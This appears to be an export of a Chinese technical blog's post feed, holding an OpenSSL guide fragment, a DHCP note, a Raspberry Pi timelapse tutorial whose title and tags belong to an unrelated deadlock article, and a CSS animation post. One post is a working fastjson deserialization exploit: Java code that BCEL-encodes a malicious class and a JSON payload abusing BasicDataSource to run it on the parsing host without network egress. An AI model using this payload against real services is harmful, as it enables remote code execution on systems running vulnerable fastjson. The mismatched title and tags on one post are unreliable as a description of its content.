如果不是infile，则为私钥</span><br><span class="line">-certfile infile   从文件中加载证书</span><br><span class="line">-CApath dir    PEM格式的CA的目录</span><br><span class="line">-CAfile infile     PEM格式的CA的文件</span><br><span class="line">-no-CAfile     不加载默认的证书文件</span><br><span class="line">-no-CApath     不从默认的证书目录中加载证书</span><br></pre></td></tr></table></figure><p>Reference</p><ul><li><a href="https://csr.chinassl.net/convert-ssl-commands.html">https://csr.chinassl.net/convert-ssl-commands.html</a></li><li><a href="https://www.jianshu.com/p/87e3753c222b">https://www.jianshu.com/p/87e3753c222b</a></li><li><a href="http://mjpclab.site/linux/openssl-self-signed-certificate">http://mjpclab.site/linux/openssl-self-signed-certificate</a></li><li><a href="https://anymarvel.github.io/AndroidSummary/book/androidan-quan/Difference_keystores.html">https://anymarvel.github.io/AndroidSummary/book/androidan-quan/Difference_keystores.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 对应 </tag>
            
            <tag> 格式 </tag>
            
            <tag> 网络 </tag>
            
            <tag> 隐私 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 程序 </tag>
            
            <tag> 证书 </tag>
            
            <tag> 私钥 </tag>
            
            <tag> pem </tag>
            
            <tag> 公钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson不出网代码利用</title>
      <link href="/posts/e387ef716681/"/>
      <url>/posts/e387ef716681/</url>
      
        <content type="html"><![CDATA[<p><a href="https://img2022.cnblogs.com/blog/1943028/202205/1943028-20220527180816472-1802841958.png" rel="noopener"><img width="695" height="288" title="image" style="display: inline; background-image: none" alt="image" src="https://static.luozhinet.com/b8/0902008aabf52287bf3bb1e0176766" border="0"></a></p><p>只是做个记录</p><p>Evil.java</p><div class="cnblogs_code"><pre><span style="color: rgba(0, 0, 255, 1)">import</span> java.io.File;<span style="color: rgba(0, 0, 255, 1)">import</span> java.io.FileNotFoundException;<span style="color: rgba(0, 0, 255, 1)">import</span> java.io.FileOutputStream;<span style="color: rgba(0, 0, 255, 1)">import</span> java.io.IOException;<p><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">class</span> Evil {<br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;    static {</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;        try {</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;            Runtime.getRuntime().exec(“calc.exe”);</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;        } catch (Exception e) {</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;            e.printStackTrace();</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;        }</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;    }</span><br>    <span style="color: rgba(0, 0, 255, 1)">static</span> {</p><pre><code>&lt;span style=&quot;color: rgba(0, 128, 0, 1)&quot;&gt;//win系统&lt;/span&gt;    String path = &quot;&lt;span style=&quot;color: rgba(139, 0, 0, 1)&quot;&gt;D:\\hello.txt&lt;/span&gt;&quot;;File file = &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;new&lt;/span&gt; File(path);String content = &quot;&lt;span style=&quot;color: rgba(139, 0, 0, 1)&quot;&gt;hello,world.\n&lt;/span&gt;&quot;;FileOutputStream fileOutputStream = &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;null&lt;/span&gt;;&lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;try&lt;/span&gt; &#123;    fileOutputStream = &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;new&lt;/span&gt; FileOutputStream(file);&#125; &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;catch&lt;/span&gt; (FileNotFoundException e) &#123;    e.printStackTrace();&#125;&lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;try&lt;/span&gt; &#123;    fileOutputStream.write(content.getBytes());&#125; &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;catch&lt;/span&gt; (IOException e) &#123;    e.printStackTrace();&#125;&lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;try&lt;/span&gt; &#123;    fileOutputStream.close();&#125; &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;catch&lt;/span&gt; (IOException e) &#123;    e.printStackTrace();&#125;</code></pre><p>}<br>}<br></pre></div></p><p>BCEL.java</p><div class="cnblogs_code"><pre><span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.Repository;<span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<p><span style="color: rgba(0, 0, 255, 1)">import</span> java.io.IOException;</p><p><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">class</span> BCEL {<br>    <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">void</span> main(String[] args) <span style="color: rgba(0, 0, 255, 1)">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException {<br>        JavaClass cls &#x3D; Repository.lookupClass(Evil.<span style="color: rgba(0, 0, 255, 1)">class</span>);<br>        String code &#x3D; Utility.encode(cls.getBytes(),<span style="color: rgba(0, 0, 255, 1)">true</span>);<br>        System.out.println(“<span style="color: rgba(139, 0, 0, 1)">$$BCEL$$</span>“+code);<br>        <span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F; 加载类并实例化</span><br>        <span style="color: rgba(0, 0, 255, 1)">new</span> ClassLoader().loadClass(“<span style="color: rgba(139, 0, 0, 1)">$$BCEL$$</span>“+code).newInstance();<br>    }<br>}</pre></div></p><p>执行BCEL.java</p><p><a href="https://img2022.cnblogs.com/blog/1943028/202205/1943028-20220527180817237-779361073.png" rel="noopener"><img width="1865" height="431" title="image" style="display: inline; background-image: none" alt="image" src="https://static.luozhinet.com/4c/39806e5a2db2f04c84c589df256e8e" border="0"></a></p><p><br></p><p>FastjsonTest.java  将上述生成BCEL带入payload</p><div class="cnblogs_code"><pre><span style="color: rgba(0, 0, 255, 1)">import</span> com.alibaba.fastjson.JSON;<p><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">class</span> FastjsonTest {<br>    <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">void</span> main(String[] args) {<br>        String payload &#x3D;<br>                “<span style="color: rgba(139, 0, 0, 1)">{\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">    {\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">        &quot;aaa&quot;: {\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                &quot;driverClassLoader&quot;: {\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                },\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dS$d9R$TA$U$3dM$s$990$O$86$EQ$W$RQ$96$EB$o$m$88$ac$ca$92r$J$f0$AE$V$85$<em>$c30$92$c1$c9L$w$e9$m$7c$91$cf$bc$40$95T$f9$B$7e$94xz$40$96B$9d$87$5e$ce$3d$e7$de$db$a7$7b$7e$fe$fa$fe$D$c0K$y$Zh$c6P$iY$j$c3$G$o$c8$c5$91$d7$f1$c2$40$M$p$3aF$N$c41f$907$ae$90$J$j$af$M$98$K$89aR$c7k$jS$C$b1$Z$d7w$e5$9c$40$q$9d$d9$U$d0$W$83$5dG$mQt$7dg$b5$5e$deq$aa$h$d6$8eG$qU$Ml$cb$db$b4$aa$ae$da</em>$82$9a$y$b95$81$96$a2$j$94$f3$b5z$c5$a9$96$z$3f$bf$7c$e0z$d3$C$f1$Z$db$bb$cc$z$c8$ed$$$ee$5b$HV$de$N$f2$F$d7sV$DY$I$ea$fe$ee$f2$a1$edT$a4$h$f8$U$b4$5e1$de$af$dd$c4$b5$8a$rK$aa$830$ecY$fe$5e$7e$5dV$5d$7fO$c5$3e$bb$aa$91$fb$b7$92$T$d7$ed$c0$97$8e$<em>$F$9a$Vc$ad$$$xuI$95c$95$F$3an$b1o$c6$a8lZ$97$96$fde$c5$aa$84g$d41Mo$e9$v$ed$a4$7f$C$c6zP$af$daN$n$y$db$a8$8e$9aS$c9L$q$91$S0$97$a6$3e$95$i$cf$Lr$f2$90$b5$cd$9bu$UeF$m$Z$c6$b3$b5$92$V$f8$96$7b$e4$e6$M$81$b6$7f$f5$a34$b3$C$5d$ff$b5$ce$c4$iRl$d4$c4$3c$de$98x$8b$F$5e$c9</em>$ac4$b1$a8zL$de$b9$y$9atm$ed$da$ce$bec$cb$5b$d0$85$db$bc$a0$f4$dd$xP$8f$s$99$bem$bf$c2$S$V$86e$e8$e5F$d5$b2iV$7c$cf$91$LG$d2$e1$83$d1$d2$99m6$Z$fdZu$r$p$d1$f4$f6$82$d2Dm$<em>$a89$e8A$82$cfZ$7d$N$Q$caW$8e$z$dc$e59$L$ce$d1$c1S$88$e30$fc$80c$y$E$e3h$e5h$5e$Q$f0$Q$8fB$ac$ed$8fX$8c$f2$f7$88$S$5bN5$7c$3cCd$8b9$b4b$w$ba$oV$cf$Q$db$g$3a$85$be$fa$N$c6$94$d6$ae$9d$a0q8$7b$C$e3$E$f7$ae$90$a6$e1$T$dc$bf$de$j3Y$S$j$e8b$89$5ed$d9$99$89$JLa$96s$ql$aa$c08XX$edL$b6$93$60CI$b4S$f3$98$aa$Ot$a3$93$ca$t$d4$f6P$dd$8d$R$3ce$86$5e$e6$Y$60$96$3e$ded$3f$96$90$J$P$f5$O$3a$Z$d1P$ad$91$a9V$9d$5c$cd</em>$ad$o$bct$95W$Z0$c9$ac$dd$3ct$C$e3$cc$d9E$93$92$Yc$95gd$3d$t$p$83$d89aMG$af$8e$bep$ec$87$d01$Q$fb$a0$p$j$xp8$a7$a7$ea$T$q$x$97$H$7f$D$5e$f56fq$E$A$A&quot;\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">        }\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">    }:&quot;xxx&quot;\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">}</span>“;<br>        JSON.parseObject(payload);<br>    }<br>}<br></pre></div></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> file </tag>
            
            <tag> payload </tag>
            
            <tag> import </tag>
            
            <tag> string </tag>
            
            <tag> exec </tag>
            
            <tag> 生成 </tag>
            
            <tag> bcel </tag>
            
            <tag> static </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCIA-DHCP</title>
      <link href="/posts/514535178586/"/>
      <url>/posts/514535178586/</url>
      
        <content type="html"><![CDATA[<p><img src="https://static.luozhinet.com/78/a865b8f5324c4fdc145050dc2a36f4"></p><p> 动态主机配置协议：</p><p>　　UDP 67 68</p><p>作用：为主机下发IP信息</p><p><img src="https://static.luozhinet.com/c4/08ddeece37be4c25f420a5218a3300"></p><p><img src="https://static.luozhinet.com/dc/b5c05ad32748f57ec8aa9080664d7d"></p><ul><li> 为了获取IP地址等配置信息，DHCP客户端需要和DHCP服务器进行报文交互。</li><li>首先，DHCP客户端发送DHCP发现报文来发现DHCP服务器。DHCP服务器会选取一个未分配的IP地址，向DHCP客户端发送DHCP提供报文。此报文中包含分配给客户端的IP地址和其他配置信息。如果存在多个DHCP服务器，每个DHCP服务器都会响应。</li><li>如果有多个DHCP服务器向DHCP客户端发送DHCP提供报文，DHCP客户端将会选择收到的第一个DHCP提供报文，然后发送DHCP请求报文，报文中包含请求的IP地址。收到DHCP请求报文后，提供该IP地址的DHCP服务器会向DHCP客户端发送一个DHCP确认报文，包含提供的IP地址和其他配置信息。DHCP客户端收到DHCP确认报文后，会发送免费的ARP报文，检查网咯中是否有其他的主机使用分配的IP地址。如果指定时间内没有收到ARP应答，DHCP客户端会使用这个IP地址。如果有主机使用该IP地址，DHCP客户端会向DHCP服务器发送DHCP拒绝报文，通知服务器该IP地址已经被占用。然后DHCP客户端会向服务器重新申请一个IP地址。</li></ul><p><img src="https://static.luozhinet.com/e0/c2e3eedcfd5bc0f8adec5e3155a6f2"></p><p> 配置：</p><p><img src="https://static.luozhinet.com/13/200318f071837e017dbe2685e6c7b3"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> 免费 </tag>
            
            <tag> 地址 </tag>
            
            <tag> 发送 </tag>
            
            <tag> dhcp </tag>
            
            <tag> 客户端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决库存扣减及订单创建时防止并发死锁的问题</title>
      <link href="/posts/69cbacc1a50e/"/>
      <url>/posts/69cbacc1a50e/</url>
      
        <content type="html"><![CDATA[<h2 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h2><blockquote><p>看着阴暗的角落里吃灰噎到嗓子眼的树莓派，一起陪伴的时光历历在目，往事逐渐涌上心头，每每触及此处，内心总会升腾起阵阵怜悯之情…</p></blockquote><p>我这有两个设备，一个是积灰已久的树莓派，另一个是积灰已久的USB摄像头。</p><p>我们今天用这两个设备做一个拍摄监控方案（非视频录制），然后将拍摄好的图片合成视频进行观看。</p><p>主要用到的技术有：树莓派&#x2F;linux操作，crontab，python，ffmpeg。</p><h2 id="【系列目录】"><a href="#【系列目录】" class="headerlink" title="【系列目录】"></a>【系列目录】</h2><ol><li>树莓派驱动usb摄像头（非官方摄像头模块）</li><li>树莓派加载外接USB硬盘</li><li>树莓派拍摄获取素材程序</li><li>树莓派定时任务编写</li><li>将素材图片合成视频</li></ol><h2 id="【实现过程】"><a href="#【实现过程】" class="headerlink" title="【实现过程】"></a>【实现过程】</h2><h4 id="树莓派驱动usb摄像头（非官方摄像头模块）"><a href="#树莓派驱动usb摄像头（非官方摄像头模块）" class="headerlink" title="树莓派驱动usb摄像头（非官方摄像头模块）"></a>树莓派驱动usb摄像头（非官方摄像头模块）</h4><p>首先我们要保证树莓派可以识别usb摄像头设备，使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到usb设备列表第一个即 <em>海康威视1080p</em> usb摄像头，说明我们的摄像头设备被正确识别，如果无法识别，则要排除设备故障或想办法安装设备驱动程序。</p><p>我们使用fswebcam应用来驱动usb摄像头模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fswebcam</span><br><span class="line">sudo apt-get install mplayer</span><br></pre></td></tr></table></figure><p>简单输入拍照命令测试下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fswebcam -r 1920*1080 --delay 3 --skip 10 1.jpg</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/68/d30bcb84ecd167082288728939949c" alt="image"></p><p><img src="https://static.luozhinet.com/06/c31781a6cbc5d1d8b0454655251d21" alt="image"></p><p>我们把树莓派上的 1.jpg 下载下来进行查看，成功拍摄到了画面！</p><p><img src="https://static.luozhinet.com/5e/8b6bcf5635c27baafcab938422f312" alt="image"></p><p>我们在使用fswebcam时，增加了几个参数，下面介绍这几个参数的作用：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 1920*1080</td><td>拍摄图片分辨率</td></tr><tr><td>--delay 3</td><td>延时3s后拍摄（给摄像头自动对焦的时间，否则会模糊，这个经常拍照的可以理解吧）</td></tr><tr><td>--skip 10</td><td>作用同上，拍摄时其实会拍摄好多帧，我们跳过前10帧以保证清晰度</td></tr></tbody></table><h4 id="树莓派加载外接USB硬盘"><a href="#树莓派加载外接USB硬盘" class="headerlink" title="树莓派加载外接USB硬盘"></a>树莓派加载外接USB硬盘</h4><p>我们计划编写一个程序来长时间捕捉摄像头画面，那么就需要一个比较大的存储空间来存放我们拍摄的图片，我们从小角落找到一个同样“积灰已久”的固态硬盘。</p><p>windows下使用过的硬盘，推荐格式化成<em>FAT32</em>格式，该格式是兼容Linux系统文件格式的，NTFS格式兼容性不是特别好，可能读写会出问题。</p><blockquote><p>当然直接用linux fdisk命令格式化成 ext2&#x2F;3&#x2F;4 也是可以的，但是后续在windows环境下读写又是新问题，如果硬盘不是准备永久挂载在linux系统下使用，还是建议用<em>FAT32</em>格式使用。</p></blockquote><blockquote><p>windows10&#x2F;11 下已经不提供格式成 <em>FAT32</em> 的入口，我们可以下载奥梅分区助手快速格式化成想要的格式。</p></blockquote><p>使用命令查看固态硬盘是否被识别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到，第二个usb设备便是我们的usb固态硬盘设备了（M.2硬盘放到了USB硬盘盒进行外接）</p><p>使用 fdisk 命令查看硬盘属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/ca/4ead62f47bef4459e3d406d8869cab" alt="image"></p><p>使用 mount 挂载硬盘设备，将磁盘挂载到 &#x2F;mnt&#x2F;sda1 路径下</p><p>虽然网上有很多教程说配置一个配置文件（具体配置我就不说了），然后让设备开机自动挂载，但我个人极不推荐，修改配置文件开机自动挂载虽然貌似一劳永逸，但在硬盘设备发生变更时，大概率因为忘记同步修改配置文件，会造成无法启动系统的严重故障，折腾不说还可能需要重装系统解决…其实启动不频繁情况下，手动装载也不费事。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda3 /mnt/sda1</span><br></pre></td></tr></table></figure><p>然后使用 df 命令查看存储占用详情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/3b/84468b1d130947192a6af2f54e5eec" alt="image"></p><p>可以看到硬盘成功挂载。</p><h4 id="树莓派拍摄获取素材程序"><a href="#树莓派拍摄获取素材程序" class="headerlink" title="树莓派拍摄获取素材程序"></a>树莓派拍摄获取素材程序</h4><p>我们编写一个短小的python脚本来实现以下几点小功能：</p><ul><li>据时间归档目录</li><li>调用api执行拍照，并按时间戳命名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path = <span class="string">&#x27;/mnt/sda1&#x27;</span></span><br><span class="line">    <span class="comment"># path = &#x27;E:\code\Project.Python\CameraShoot&#x27;</span></span><br><span class="line">    folder = <span class="string">f&#x27;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder):</span><br><span class="line">        os.mkdir(folder)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拍照</span></span><br><span class="line">    os.system(</span><br><span class="line">        <span class="string">f&#x27;fswebcam -r 1920*1080 --delay 3 --skip 10 <span class="subst">&#123;folder&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)&#125;</span>.jpg&#x27;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h4 id="树莓派定时任务编写"><a href="#树莓派定时任务编写" class="headerlink" title="树莓派定时任务编写"></a>树莓派定时任务编写</h4><p>我们使用 linux 环境下的 crontab 编写定时任务，来定时执行拍照任务（初步定每分钟拍一张）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * python /7tiny/camera_shoot.py</span><br></pre></td></tr></table></figure><p>采用定时任务，每分钟自动调度执行我们写好的python脚本，来进行拍照任务的执行</p><p>等待一段时间后，便可拿到拍摄素材…</p><p><img src="https://static.luozhinet.com/bf/98d9ef3a8b54c1fc38bd89e5893bf7" alt="image"></p><p><img src="https://static.luozhinet.com/3e/b29151741bc38c17762c7ac9681d08" alt="image"></p><h4 id="将素材图片合成视频"><a href="#将素材图片合成视频" class="headerlink" title="将素材图片合成视频"></a>将素材图片合成视频</h4><p>我们先简单从树莓派上下载下来拍摄好的图片，在 windows 上简单合成一个视频，完成我们的任务目标，后期可以根据需要在树莓派上自动合成。</p><p>我们用 ffmpeg 软件将图片合成为视频。</p><p>首先下载 ffmpeg 软件的 exe 版本（windows），linux上可直接下载linux版。</p><p>然后将解压后 ffmpeg 的 exe 目录添加到环境变量，方便我们执行命令。</p><p>将树莓派上的图片下载下来。</p><p><img src="https://static.luozhinet.com/0e/2087bb6f73079f8085b5de7fc1cc66" alt="image"></p><p>下载下来的图片我们是默认使用时间戳来命名图片的，因为ffmpeg只能从 0 - n 顺序识别图片，无法识别时间戳这种命名，因此，我这里自己编写了一个工具将图片名称替换成了 0 - n.jpg。</p><p>有需要的同学可以在文末获取到工具源码及下载地址。</p><p>重命名好后，我们执行命令压缩图片为 mp4 文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -r <span class="number">10</span> -f image2 -i %d.jpg -vcodec libx264 -pix_fmt yuv420p out.mp4</span><br></pre></td></tr></table></figure><p>同样我们介绍下使用的几个参数：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 10</td><td>视频为每秒10帧，可以根据需要调整，10帧就是10张图片</td></tr><tr><td>%d</td><td>从0开始在当前目录递增寻找图片</td></tr><tr><td>-vcodec libx264（windows兼容）</td><td></td></tr><tr><td>-vcodec libx265（体积更小，windows默认不支持）</td><td>视频压缩参数</td></tr><tr><td>-pix_fmt yuv420p</td><td>视频编码格式（windows下播放兼容）</td></tr></tbody></table><p>执行后，我们便可查看到图片被拼接成为 mp4 格式的视频。</p><p><img src="https://static.luozhinet.com/e2/635305b8ad961ffad26395b53a4fc8" alt="image"></p><p><img src="https://static.luozhinet.com/c6/57431b6621e6f56c8c111dcae343ea" alt="image"></p><h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>本文通过短小的代码片段初步使用树莓派+usb摄像头进行环境捕捉，在此基础上，可以进行很多额外的场景扩展及使用优化。</p><h2 id="【源码地址】"><a href="#【源码地址】" class="headerlink" title="【源码地址】"></a>【源码地址】</h2><p>重命名工具源码及编译后绿色程序：<br><a href="https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe">https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 创建 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 处理 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 运行 </tag>
            
            <tag> exec </tag>
            
            <tag> 代码 </tag>
            
            <tag> 帐号 </tag>
            
            <tag> var </tag>
            
            <tag> sys </tag>
            
            <tag> sqlclient </tag>
            
            <tag> dbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>妙啊！动画还可以这样控制？</title>
      <link href="/posts/d77b3f737815/"/>
      <url>/posts/d77b3f737815/</url>
      
        <content type="html"><![CDATA[<p>今天，有在群里看到这样一个问题：<strong>有一个动画，一开始静止处于第一帧，只在用户 hover 的时候运行动画，在运行一次后停止，并且停留在最后一帧</strong>，使用 CSS 可以完成么？</p><p>像是这样：</p><p><img src="https://static.luozhinet.com/4e/f9ff699ab8a57ff8ee2dfd3f4cb1ab"></p><p>一个非常有意思的问题，答案是可以的。我们抽取一下其中的关键点：</p><ol><li>动画只运行一次，未运行前处于第一帧，运行完后处于最后一帧</li><li>动画通过 hover 驱动，只有用户 hover 元素的时候，动画才进行</li></ol><h2 id="animation-fill-mode-控制元素在各个阶段的状态"><a href="#animation-fill-mode-控制元素在各个阶段的状态" class="headerlink" title="animation-fill-mode 控制元素在各个阶段的状态"></a>animation-fill-mode 控制元素在各个阶段的状态</h2><p>首先，动画只运行一次，未运行前处于第一帧，运行完后处于最后一帧。</p><p>这个刚好利用 CSS 动画的 <code>animation-fill-mode: both</code> 即可。</p><ol><li><code>animation-fill-mode: backwards</code>：可以让元素在动画开始之前的样式为动画运行时的第一帧，动画结束后的样式则恢复为 CSS 规则设定的样式</li><li><code>animation-fill-mode: forwards</code>：元素在动画开始之前的样式为 CSS 规则设定的样式，而动画结束后的样式则表现为由执行期间遇到的最后一个关键帧计算值（也就是停在最后一帧）</li></ol><p>而，<code>animation-fill-mode: both</code> 兼顾了上面两种模式的特点，可以使得<strong>动画开始前的样式为动画运行时的第一帧，动画结束后停在最后一帧</strong>。</p><h2 id="反向利用-animation-play-state-实现-hover-触发动画行进"><a href="#反向利用-animation-play-state-实现-hover-触发动画行进" class="headerlink" title="反向利用 animation-play-state 实现 hover 触发动画行进"></a>反向利用 animation-play-state 实现 hover 触发动画行进</h2><p>而<strong>动画通过 hover 驱动，只有用户 hover 元素的时候，动画才进行</strong>这一点，利用 <code>animation-play-state</code> 即可。</p><p>我们都知道，正常情况下，动画应该是运行状态，那如果我们将动画的默认状态设置为暂停，只有当鼠标点击或者 hover 的时候，才设置其 <code>animation-play-state: running</code>，这样就可以利用 hover 控制动画的行进！</p><p>基于上述两点，我们来实现一个有意思的打字动画，做到动画只触发单次，并且只有 hover 的时候动画会运行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hover Me - You are a pig!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">font-family</span>: monospace;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">26ch</span>;</span><br><span class="line">    <span class="attribute">animation</span>: typing <span class="number">3s</span> <span class="built_in">steps</span>(<span class="number">15</span>, end);</span><br><span class="line">    <span class="attribute">animation-fill-mode</span>: both;</span><br><span class="line">    <span class="attribute">animation-play-state</span>: paused;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>  &#123;</span><br><span class="line">    <span class="attribute">animation-play-state</span>: running;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">4px</span>;</span><br><span class="line">    